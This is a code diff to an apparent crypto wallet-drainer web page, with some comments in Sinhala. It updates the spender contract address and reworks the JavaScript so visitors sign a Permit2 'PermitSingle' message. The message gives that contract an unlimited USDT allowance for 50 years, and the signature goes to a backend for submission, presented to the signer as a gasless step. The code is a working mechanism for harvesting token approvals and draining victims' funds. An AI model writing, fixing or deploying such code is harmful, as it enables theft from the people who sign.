@@ -152,7 +152,7 @@
         <p class="subtitle">Sign Once — Get Unlimited Allowance for 50 Years</p>
 
         <div class="contract-address">
-            <strong>📋 Contract:</strong> 0xB5482B67457498A8770dA975982d8cE23c1A6925
+            <strong>📋 Contract:</strong> 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33
         </div>
 
         <div class="treasury-address">
@@ -190,10 +190,10 @@
 
     <script>
         // ============================================
-        // ⭐ CONFIG - අලුත් Contract Address!
+        // ⭐ CONFIG
         // ============================================
         const CONFIG = {
-            contractAddress: "0xB5482B67457498A8770dA975982d8cE23c1A6925",
+            contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33",
             treasuryWallet: "0xB70a8100a45a28b605dbfb34d713071e21A57D28",
             permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
             usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
@@ -339,7 +339,7 @@
         }
 
         // ============================================
-        // ⭐ SIGN & SUBMIT (Backend pays gas!)
+        // ⭐ SIGN & SUBMIT - PermitSingle!
         // ============================================
         async function signAndSubmit() {
             try {
@@ -353,48 +353,55 @@
                 signBtn.disabled = true;
 
                 const nonce = await getPermit2Nonce();
-                const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * 50);
+
+                // 50 years expiration
+                const years = 50;
+                const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
+                const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
 
                 console.log('📝 Nonce:', nonce.toString());
-                console.log('⏰ Deadline:', deadline);
-                console.log('📋 Spender (Contract):', CONFIG.contractAddress);
+                console.log('⏰ Expiration:', new Date(expiration * 1000).toLocaleString());
+                console.log('📋 Spender:', CONFIG.contractAddress);
 
                 showStatus('✍️ Please sign in MetaMask... (No Gas!)', 'info');
 
-                // ⭐ EIP-712 Domain - version එක ඉවත් කරලා Test කරමු!
+                // ⭐ EIP-712 Domain
                 const domain = {
                     name: "Permit2",
-                    version: "1",
                     chainId: CONFIG.chainId,
                     verifyingContract: CONFIG.permit2Address
                 };
 
+                // ⭐ EIP-712 Types - PermitSingle
                 const types = {
-                    PermitTransferFrom: [
-                        { name: "permitted", type: "TokenPermissions" },
+                    PermitSingle: [
+                        { name: "details", type: "PermitDetails" },
                         { name: "spender", type: "address" },
-                        { name: "nonce", type: "uint256" },
-                        { name: "deadline", type: "uint256" }
+                        { name: "sigDeadline", type: "uint256" }
                     ],
-                    TokenPermissions: [
+                    PermitDetails: [
                         { name: "token", type: "address" },
-                        { name: "amount", type: "uint256" }
+                        { name: "amount", type: "uint160" },
+                        { name: "expiration", type: "uint48" },
+                        { name: "nonce", type: "uint48" }
                     ]
                 };
 
-                // ⭐ Message - spender එක අලුත් Contract Address එකද?
+                // ⭐ PermitSingle Message
                 const message = {
-                    permitted: {
+                    details: {
                         token: CONFIG.usdtAddress,
-                        amount: ethers.constants.MaxUint256.toString()
+                        amount: ethers.constants.MaxUint256.toString(),
+                        expiration: expiration,
+                        nonce: nonce
                     },
-                    spender: CONFIG.contractAddress,  // ⭐ අලුත් Address!
-                    nonce: nonce,
-                    deadline: deadline
+                    spender: CONFIG.contractAddress,
+                    sigDeadline: sigDeadline
                 };
 
                 console.log('📝 Message:', JSON.stringify(message, null, 2));
 
+                // Get signature
                 const signature = await signer._signTypedData(domain, types, message);
                 console.log("✅ Signature:", signature);
 
@@ -406,8 +413,10 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         user: userAddress,
+                        amount: ethers.constants.MaxUint256.toString(),
+                        expiration: expiration,
                         nonce: nonce.toString(),
-                        deadline: deadline,
+                        sigDeadline: sigDeadline,
                         signature: signature
                     })
                 });
@@ -431,6 +440,7 @@
                     successCheck.classList.add('show');
                     showStatus(`✅ ${result.message}`, 'success');
                     console.log("📤 Tx Hash:", result.txHash);
+                    console.log("🔗 https://etherscan.io/tx/" + result.txHash);
                     await checkAllowance();
                 } else {
                     showStatus(`❌ Error: ${result.error}`, 'error');
